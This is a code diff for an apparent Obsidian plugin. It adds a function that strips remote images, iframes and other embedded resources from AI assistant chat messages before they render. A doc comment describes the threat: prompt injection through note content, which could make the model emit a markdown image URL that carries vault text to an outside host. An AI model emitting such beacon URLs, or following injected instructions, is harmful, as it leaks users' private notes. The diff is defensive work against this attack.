@@ -72,6 +72,68 @@ function hasMeaningfulRenderedContent(el: HTMLElement): boolean {
   return Boolean(el.querySelector("img, video, audio, canvas, svg, pre, code, table, ul, ol"));
 }
 
+const REMOTE_RESOURCE_SELECTOR = "img, iframe, video, audio, source, object, embed, track";
+const REMOTE_RESOURCE_ATTRS = ["src", "srcset", "data", "poster"] as const;
+const BLOCKED_RESOURCE_CLS = "vaultguard-chat-blocked-resource";
+
+/** Schemes an assistant bubble may load a resource from without leaving the device. */
+function isLocalResourceUrl(value: string): boolean {
+  const trimmed = value.trim();
+  if (!trimmed) return true;
+  const lower = trimmed.toLowerCase();
+  if (lower.startsWith("app://") || lower.startsWith("data:") || lower.startsWith("blob:")) return true;
+  // A scheme-less value is a vault-relative embed Obsidian resolved locally.
+  return !/^[a-z][a-z0-9+.-]*:/.test(lower) && !lower.startsWith("//");
+}
+
+function describeBlockedHost(value: string): string {
+  try {
+    return new URL(value.trim()).host || "external resource";
+  } catch {
+    return "external resource";
+  }
+}
+
+/**
+ * Neutralise every element that would make Electron fetch a REMOTE resource
+ * the moment a rendered assistant message lands in the DOM. Model output is
+ * attacker-influenceable (prompt injection through note content, a hostile
+ * provider), so `![](https://host/?d=<vault text>)` would otherwise be a
+ * zero-click exfiltration beacon outside every governed network path
+ * (`requestUrl`, the pinned Anthropic stream) and invisible to the
+ * telemetry-policy source scan. Local (`app://`, `data:`, `blob:`, vault
+ * embeds) resources are kept; anything else is replaced by an inert chip.
+ * Exported for the renderer test.
+ */
+export function neutralizeRemoteResources(root: HTMLElement): number {
+  let blocked = 0;
+  root.querySelectorAll(REMOTE_RESOURCE_SELECTOR).forEach((node) => {
+    const el = node as HTMLElement;
+    const remote = REMOTE_RESOURCE_ATTRS
+      .map((attr) => el.getAttribute(attr) ?? "")
+      .filter((value) => value && !isLocalResourceUrl(value));
+    // <source srcset="a.png 1x, https://x/b.png 2x"> — treat any remote
+    // candidate in a srcset as remote.
+    const srcset = el.getAttribute("srcset") ?? "";
+    const remoteSrcset = srcset
+      .split(",")
+      .map((candidate) => candidate.trim().split(/\s+/)[0] ?? "")
+      .filter((url) => url && !isLocalResourceUrl(url));
+    const tag = el.tagName.toLowerCase();
+    if (remote.length === 0 && remoteSrcset.length === 0 && tag !== "iframe" && tag !== "object" && tag !== "embed") {
+      return;
+    }
+    blocked += 1;
+    const host = describeBlockedHost(remote[0] ?? remoteSrcset[0] ?? "");
+    const chip = el.ownerDocument.createElement("span");
+    chip.className = BLOCKED_RESOURCE_CLS;
+    chip.textContent = `[external ${tag} blocked: ${host}]`;
+    chip.setAttribute("title", "VaultGuard does not load remote resources from assistant messages.");
+    el.replaceWith(chip);
+  });
+  return blocked;
+}
+
 function removeChatRules(el: HTMLElement): void {
   // Literal HTML <hr> can bypass the markdown-line sanitizer; remove it from
   // assistant/error bubbles so divider-only chunks do not become stacked rules.
@@ -113,6 +175,10 @@ export function renderMarkdownWithFallback(
 
   void MarkdownRenderer.render(app, markdown, renderTarget, sourcePath, component).then(
     () => {
+      // The render target is hidden (display:none via CSS) while Obsidian
+      // renders into it; strip remote resources BEFORE the children move into
+      // the visible bubble so no request is ever issued for them.
+      neutralizeRemoteResources(renderTarget);
       removeChatRules(renderTarget);
       decorateCodeBlocks(renderTarget);
 
